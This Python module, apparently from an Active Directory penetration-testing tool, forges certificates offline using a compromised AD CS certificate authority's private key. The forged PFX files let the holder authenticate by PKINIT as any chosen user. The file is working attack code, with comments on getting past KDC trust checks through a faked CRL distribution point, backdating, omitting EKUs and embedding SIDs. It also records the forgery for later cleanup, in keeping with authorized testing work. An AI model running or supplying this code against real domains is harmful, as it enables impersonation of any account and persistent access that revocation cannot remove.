"""Native ADCS certificate forging (offline certificate forge).

Replaces ``certipy forge`` subprocess.  Pure-cryptography operation: takes a
compromised CA's PFX (private key + cert), builds a new certificate with
arbitrary SAN/UPN/SID, signs it with the CA key, and writes a PFX that any
PKINIT-capable client can use to authenticate as the victim.

Public entry point: :func:`forge_certificate_native`.

Mirrors certipy's ``Forge`` flow (commands/forge.py) but trimmed to the
ADscan-relevant set of options (UPN, DNS, SID, subject override, validity
period, key size).  S/MIME and application-policy extensions are out of scope
for ADscan's ESC5 CA-key-forge chain — easy to add later if a customer needs
them.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Optional

from adscan_internal import telemetry
from adscan_core.rich_output import (
    get_console,
    mark_sensitive,
    print_error,
    print_info_verbose,
)
from adscan_core.rich_output import print_exception


# Microsoft OIDs reused from certipy.lib.certificate (kept local so this
# module has no certipy import-time dependency).
_PRINCIPAL_NAME_OID = "1.3.6.1.4.1.311.20.2.3"  # SAN OtherName UPN
_NTDS_CA_SECURITY_EXT_OID = "1.3.6.1.4.1.311.25.2"  # SID extension
_NTDS_OBJECTSID_OID = "1.3.6.1.4.1.311.25.2.1"  # OctetString inside the GeneralName
_SAN_URL_PREFIX = "tag:microsoft.com,2022-09-14:sid:"


@dataclass(frozen=True)
class ForgeConfig:
    """Inputs for an offline certificate forge from a compromised CA key.

    Args:
        ca_pfx_path: Path to the compromised CA's PFX (cert + private key).
        ca_pfx_password: Password protecting the CA PFX (None / empty for
            unencrypted).
        target_upn: Optional UPN to embed in the SAN OtherName (PKINIT cname).
        target_dns: Optional DNS name to embed in the SAN.
        target_sid: Optional SID — embedded both as the SAN URL extension
            (post-May 2025 strong-mapping) and as the szOID_NTDS_CA_SECURITY_EXT
            ObjectSID extension (legacy strong-mapping).
        subject_dn: Optional override for the subject DN (defaults to ``CN=upn``).
        issuer_dn: Optional override for the issuer DN (defaults to the CA cert
            subject — what real CAs do).
        crl_uri: Optional CRL distribution point URL.
        serial: Optional explicit serial (hex, colons stripped); random if None.
        key_size: RSA key size for the forged keypair.
        validity_days: How long the forged cert is valid (from now).
        pfx_password: Optional password for the output PFX (default: empty for
            ADscan's downstream tooling, which expects unencrypted PFXs).
    """

    ca_pfx_path: str
    ca_pfx_password: Optional[str] = None
    target_upn: Optional[str] = None
    target_dns: Optional[str] = None
    target_sid: Optional[str] = None
    subject_dn: Optional[str] = None
    issuer_dn: Optional[str] = None
    crl_uri: Optional[str] = None
    serial: Optional[str] = None
    key_size: int = 2048
    validity_days: int = 365
    pfx_password: str = ""


@dataclass
class ForgeResult:
    """Outcome of a forge attempt.

    Attributes mirror :class:`CertRequestResult` so downstream callers
    (``ptc_certipy``, attack-graph step updates) can consume both
    interchangeably.
    """

    success: bool
    pfx_path: Optional[Path] = None
    pfx_password: Optional[str] = None
    cert_subject: Optional[str] = None
    cert_san: Optional[str] = None
    cert_serial: Optional[str] = None
    error: Optional[str] = None


def build_ca_crl_distribution_uri(
    ca_name: Optional[str],
    ca_host: Optional[str],
    domain: Optional[str],
) -> Optional[str]:
    """Build a CA's default AD CS LDAP CRL distribution-point URI.

    A forged (golden) certificate has no enrollment request and therefore no CRL
    distribution point of its own. Without one, the KDC's revocation check during
    PKINIT fails and it returns ``KDC_ERR_CLIENT_NOT_TRUSTED`` — Oliver Lyak's
    documented "missing CRL" cause, the exact failure ``certipy forge`` hits
    unless it clones a real issued cert via ``-template``.

    Every certificate an AD CS enterprise CA issues carries the CA's default LDAP
    CDP, which points at the CRL object published under
    ``CN=<CA-name>,CN=<CA-server-short-name>,CN=CDP,CN=Public Key Services,
    CN=Services,CN=Configuration,<config-NC>``. This reproduces that exact URI so
    a forged cert survives the KDC's revocation check the same way a legitimately
    issued cert (or ``certipy forge -template``) does. Verified byte-for-byte
    against a real ``ESSOS-CA``-issued certificate's CDP.

    Args:
        ca_name: The CA's common name (e.g. ``ESSOS-CA``) — ``domains_data[...]["ca"]``.
        ca_host: The CA host (FQDN or short name); only its short name is used.
        domain: The AD domain (e.g. ``essos.local``) — becomes the config NC.

    Returns:
        The ``ldap:///...`` CDP URI, or ``None`` when any component is missing
        (the caller then forges without a CDP, i.e. the prior behaviour).
    """
    if not ca_name or not ca_host or not domain:
        return None
    server_short = ca_host.split(".", 1)[0].strip()
    if not server_short:
        return None
    config_nc = ",".join(f"DC={part}" for part in domain.split(".") if part.strip())
    if not config_nc:
        return None
    dn = (
        f"CN={ca_name.strip()},CN={server_short},CN=CDP,"
        "CN=Public Key Services,CN=Services,CN=Configuration,"
        f"{config_nc}"
    )
    # AD CS URL-encodes the spaces in the fixed container names (``%20``); CA and
    # host CNs are LDAP tokens with no characters that need further escaping.
    dn_encoded = dn.replace(" ", "%20")
    return (
        f"ldap:///{dn_encoded}"
        "?certificateRevocationList?base?objectClass=cRLDistributionPoint"
    )


# ---------------------------------------------------------------------------
# Internal builders — kept private; the public entry point is forge_certificate_native.
# ---------------------------------------------------------------------------


def _parse_subject_dn(dn: str):
    """Parse an ADscan-flavored DN string (``CN=foo,O=bar,DC=baz``) into x509.Name."""
    from cryptography import x509
    from cryptography.x509.oid import NameOID

    name_lookup = {
        "CN": NameOID.COMMON_NAME,
        "O": NameOID.ORGANIZATION_NAME,
        "OU": NameOID.ORGANIZATIONAL_UNIT_NAME,
        "L": NameOID.LOCALITY_NAME,
        "S": NameOID.STATE_OR_PROVINCE_NAME,
        "ST": NameOID.STATE_OR_PROVINCE_NAME,
        "C": NameOID.COUNTRY_NAME,
        "DC": NameOID.DOMAIN_COMPONENT,
        "E": NameOID.EMAIL_ADDRESS,
        "EMAIL": NameOID.EMAIL_ADDRESS,
    }
    attrs = []
    for component in (c.strip() for c in dn.split(",") if c.strip()):
        if "=" not in component:
            continue
        key, _, value = component.partition("=")
        oid = name_lookup.get(key.strip().upper())
        if oid is None:
            continue
        attrs.append(x509.NameAttribute(oid, value.strip()))
    return x509.Name(attrs)


def _build_sid_extension(sid: str):
    """Build the szOID_NTDS_CA_SECURITY_EXT extension carrying the victim SID."""
    from asn1crypto import x509 as asn1x509
    from cryptography import x509

    sid_extension = asn1x509.GeneralNames(
        [
            asn1x509.GeneralName(
                {
                    "other_name": asn1x509.AnotherName(
                        {
                            "type_id": asn1x509.ObjectIdentifier(_NTDS_OBJECTSID_OID),
                            "value": asn1x509.OctetString(sid.encode()).retag(
                                {"explicit": 0}
                            ),
                        }
                    )
                }
            )
        ]
    )
    return x509.UnrecognizedExtension(
        x509.ObjectIdentifier(_NTDS_CA_SECURITY_EXT_OID),
        sid_extension.dump(),
    )


def _build_san(config: ForgeConfig):
    """Compose SubjectAlternativeName from the optional UPN / DNS / SID URL."""
    from asn1crypto import core as asn1core
    from cryptography import x509

    sans: list = []
    if config.target_dns:
        sans.append(x509.DNSName(config.target_dns))
    if config.target_upn:
        upn_encoded = asn1core.UTF8String(config.target_upn).dump()
        sans.append(
            x509.OtherName(x509.ObjectIdentifier(_PRINCIPAL_NAME_OID), upn_encoded)
        )
    if config.target_sid:
        sans.append(
            x509.UniformResourceIdentifier(f"{_SAN_URL_PREFIX}{config.target_sid}")
        )
    return sans


def _select_hash_for_key(ca_cert) -> "object":
    """Pick a SHA-2 hash matching the CA cert's signature, defaulting to SHA-256."""
    from cryptography.hazmat.primitives import hashes

    algo = ca_cert.signature_hash_algorithm
    name = (algo.name if algo is not None else "sha256").lower()
    return {
        "sha256": hashes.SHA256,
        "sha384": hashes.SHA384,
        "sha512": hashes.SHA512,
    }.get(name, hashes.SHA256)()


def _render_forge_preflight(config: ForgeConfig) -> None:
    """Premium pre-flight panel for the forge step."""
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column(style="bold")
    grid.add_row("CA PFX", mark_sensitive(config.ca_pfx_path, "path"))
    if config.target_upn:
        grid.add_row(
            "Target UPN",
            f"[bold red]{mark_sensitive(config.target_upn, 'user')}[/]",
        )
    if config.target_sid:
        grid.add_row("Target SID", mark_sensitive(config.target_sid, "user"))
    if config.target_dns:
        grid.add_row("Target DNS", mark_sensitive(config.target_dns, "hostname"))
    grid.add_row("Key size", f"[bold]{config.key_size}[/] bits RSA")
    grid.add_row("Validity", f"{config.validity_days} days")
    if config.issuer_dn:
        grid.add_row("Issuer", mark_sensitive(config.issuer_dn, "service"))
    title = Text("  Forge Certificate (CA Key)  ", style="bold white on red")
    panel = Panel(grid, title=title, border_style="red", padding=(1, 2))
    get_console().print(panel)


def _render_forge_result(
    cert, cert_serial: str, cert_subject: str, pfx_path: Path
) -> None:
    """Premium result panel for the issued forged cert."""
    from cryptography.hazmat.primitives import hashes
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    fp_sha1 = ":".join(
        f"{b:02X}" for b in cert.fingerprint(hashes.SHA1())  # noqa: S303 — display only
    )

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column()
    grid.add_row("Status", "[bold green]✓ FORGED[/]")
    grid.add_row("Serial", f"[cyan]{cert_serial}[/]")
    grid.add_row("Subject", cert_subject)
    grid.add_row("Issuer", cert.issuer.rfc4514_string())
    grid.add_row(
        "Valid from",
        cert.not_valid_before_utc.strftime("%Y-%m-%d %H:%M UTC"),
    )
    grid.add_row(
        "Valid to",
        cert.not_valid_after_utc.strftime("%Y-%m-%d %H:%M UTC"),
    )
    grid.add_row("SHA-1 fp", f"[dim]{fp_sha1}[/]")
    grid.add_row("PFX path", mark_sensitive(str(pfx_path), "path"))

    title = Text("  Certificate Forged  ", style="bold white on green")
    panel = Panel(grid, title=title, border_style="green", padding=(1, 2))
    get_console().print(panel)


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------


def forge_certificate_native(
    config: ForgeConfig,
    output_dir: Path,
    *,
    shell: Any = None,
    domain: Optional[str] = None,
    technique: str = "AD CS ESC5 — offline certificate forge",
    ca_name: Optional[str] = None,
    ca_host: Optional[str] = None,
) -> ForgeResult:
    """Forge a certificate using a compromised CA's private key.

    The operation is purely local — no network, no Kerberos, no LDAP.  The
    caller must already have obtained the CA PFX out-of-band (native CA backup
    or DCSync of the CA's protected key material).

    Environment-change disclosure (AD CS ESC5): when ``shell`` carries an
    ``environment_change_ledger``, a successful forge is disclosed as a
    ``manual_required`` cleanup item. A forged certificate carries no request id
    and is absent from the CA database, so the normal revocation procedure
    cannot reach it — the disclosure says so and points at CA key rotation.
    Disclosure lives here in the primitive so every caller inherits it.

    Args:
        config: Forge inputs (CA PFX, target UPN/SID, validity).
        output_dir: Where the forged victim PFX is written.
        shell: Optional session shell carrying ``environment_change_ledger``.
        domain: Ledger domain (defaults to the target UPN's realm when present).
        technique: Ledger ``method`` recorded on the disclosure record.
        ca_name: CA whose key signed the forgery (for the disclosure prose).
        ca_host: Host the signing CA runs on (for the disclosure prose).
    """
    try:
        return _do_forge(
            config,
            output_dir,
            shell=shell,
            domain=domain,
            technique=technique,
            ca_name=ca_name,
            ca_host=ca_host,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        print_error(f"Certificate forge failed: {exc}")
        return ForgeResult(success=False, error=str(exc))


def _do_forge(
    config: ForgeConfig,
    output_dir: Path,
    *,
    shell: Any = None,
    domain: Optional[str] = None,
    technique: str = "AD CS ESC5 — offline certificate forge",
    ca_name: Optional[str] = None,
    ca_host: Optional[str] = None,
) -> ForgeResult:
    """Concrete forge implementation; the public wrapper handles top-level errors."""
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import (
        NoEncryption,
        pkcs12,
    )
    from cryptography.x509.oid import NameOID

    _render_forge_preflight(config)

    ca_pfx = Path(config.ca_pfx_path)
    if not ca_pfx.exists():
        return ForgeResult(success=False, error=f"CA PFX not found: {config.ca_pfx_path}")

    pwd = (
        config.ca_pfx_password.encode()
        if config.ca_pfx_password
        else None
    )
    print_info_verbose("  ▸ Loading CA private key + certificate...")
    ca_key, ca_cert, _addl = pkcs12.load_key_and_certificates(ca_pfx.read_bytes(), pwd)
    if ca_key is None or ca_cert is None:
        return ForgeResult(
            success=False,
            error="CA PFX did not contain a usable key/certificate pair.",
        )
    if not isinstance(ca_key, rsa.RSAPrivateKey):
        return ForgeResult(
            success=False, error="CA private key is not RSA — forging unsupported."
        )

    # New keypair for the victim — caller will use this to PKINIT.
    print_info_verbose(f"  ▸ Generating victim RSA-{config.key_size} key...")
    victim_key = rsa.generate_private_key(
        public_exponent=0x10001, key_size=config.key_size
    )

    # Subject — explicit > derived from UPN > fallback "CN=Forged".
    if config.subject_dn:
        subject = _parse_subject_dn(config.subject_dn)
    elif config.target_upn:
        subject = x509.Name(
            [x509.NameAttribute(NameOID.COMMON_NAME, config.target_upn)]
        )
    else:
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Forged")])

    issuer = (
        _parse_subject_dn(config.issuer_dn) if config.issuer_dn else ca_cert.subject
    )

    serial_int = (
        int(config.serial.replace(":", ""), 16)
        if config.serial
        else x509.random_serial_number()
    )

    now = datetime.now(timezone.utc)
    # Certipy backdates by 1 day; matches what real AD CS issues do for time
    # tolerance.  5-minute backdating was too tight against KDCs whose system
    # time drifted relative to ours and produced KDC_ERR_CLIENT_NOT_TRUSTED.
    not_before = now - timedelta(days=1)
    not_after = now + timedelta(days=int(config.validity_days))

    # Build the cert.  AKI + SKI extensions are critical for KDC trust path
    # validation — omitting SKI silently produces certs that the KDC accepts
    # in some envs and rejects with CLIENT_NOT_TRUSTED in others.
    builder = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(victim_key.public_key())
        .serial_number(serial_int)
        .not_valid_before(not_before)
        .not_valid_after(not_after)
        .add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_cert.public_key()),
            critical=False,
        )
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(victim_key.public_key()),
            critical=False,
        )
    )

    sans = _build_san(config)
    if sans:
        builder = builder.add_extension(
            x509.SubjectAlternativeName(sans), critical=False
        )

    if config.target_sid:
        builder = builder.add_extension(_build_sid_extension(config.target_sid), critical=False)

    if config.crl_uri:
        builder = builder.add_extension(
            x509.CRLDistributionPoints(
                [
                    x509.DistributionPoint(
                        full_name=[x509.UniformResourceIdentifier(config.crl_uri)],
                        relative_name=None,
                        reasons=None,
                        crl_issuer=None,
                    )
                ]
            ),
            critical=False,
        )

    # Note: deliberately NOT adding ExtendedKeyUsage.  Empirically, AD CS
    # KDCs reject forged certs that carry a *narrow* EKU list (Client Auth +
    # Smart Card Logon) with KDC_ERR_CLIENT_NOT_TRUSTED, while certs with no
    # EKU at all are treated as "valid for any purpose" and PKINIT works.
    # Certipy makes the same choice in build_new_certificate.

    print_info_verbose("  ▸ Signing forged certificate with CA private key...")
    sig_hash = _select_hash_for_key(ca_cert)
    cert = builder.sign(private_key=ca_key, algorithm=sig_hash)

    cert_subject = cert.subject.rfc4514_string()
    cert_serial = f"{cert.serial_number:X}"
    cert_san = config.target_upn or config.target_dns

    output_dir.mkdir(parents=True, exist_ok=True)
    pfx_name = (
        f"{(config.target_upn or 'forged').replace('@', '_').replace('/', '_')}"
        f"_forged_{os.urandom(4).hex()}.pfx"
    )
    pfx_path = output_dir / pfx_name
    pfx_bytes = pkcs12.serialize_key_and_certificates(
        name=(config.target_upn or "forged").encode(),
        key=victim_key,
        cert=cert,
        cas=None,
        encryption_algorithm=NoEncryption(),
    )
    pfx_path.write_bytes(pfx_bytes)

    _render_forge_result(cert, cert_serial, cert_subject, pfx_path)

    # Disclose the forged certificate — no request id, absent from the CA
    # database, unreachable by the normal revocation procedure; only CA key
    # rotation invalidates it. Best-effort: never break the forge on a ledger error.
    try:
        from adscan_internal.services.adcs import esc_cleanup as _esc_cleanup

        not_after = None
        try:
            not_after = cert.not_valid_after_utc.strftime("%Y-%m-%d %H:%M UTC")
        except Exception:  # noqa: BLE001
            not_after = None
        ledger_domain = domain
        if not ledger_domain and config.target_upn and "@" in config.target_upn:
            ledger_domain = config.target_upn.split("@", 1)[1]
        _esc_cleanup.register_forged_certificate(
            shell,
            domain=ledger_domain or "",
            technique=technique,
            principal=config.target_upn,
            target_sid=config.target_sid,
            serial=cert_serial,
            not_after=not_after,
            ca_name=ca_name,
            ca_host=ca_host,
            subject=cert_subject,
            pfx_path=str(pfx_path),
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

    return ForgeResult(
        success=True,
        pfx_path=pfx_path,
        pfx_password=config.pfx_password,
        cert_subject=cert_subject,
        cert_san=cert_san,
        cert_serial=cert_serial,
    )


__all__ = [
    "ForgeConfig",
    "ForgeResult",
    "build_ca_crl_distribution_uri",
    "forge_certificate_native",
]
